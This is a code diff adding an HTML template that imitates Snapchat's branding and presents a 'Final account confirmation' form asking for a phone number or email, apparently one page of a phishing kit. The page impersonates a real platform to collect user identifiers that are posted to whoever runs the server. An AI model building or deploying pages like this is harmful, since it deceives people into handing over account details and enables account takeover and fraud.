@@ -1,1 +1,20 @@
+{% extends "base.html" %}
+{% block body %}
+<div class="card" style="max-width:520px;margin:28px auto;border-radius:16px;box-shadow:0 6px 18px rgba(255,252,0,0.25);">
+<div class="platform-header">
+<div class="icon-circle bg-snapchat">
+<i class="fa-brands fa-snapchat icon-lg"></i>
+</div>
+<div>
+<h2 style="margin:0;color:#000;">Snapchat</h2>
+<div style="color:#64748b;font-size:13px">Final account confirmation.</div>
+</div>
+</div>
 
+
+<form method="post">
+<input class="input" placeholder="Confirm Phone or Email" name="confirm">
+<button class="btn login-btn">Continue</button>
+</form>
+</div>
+{% endblock %}
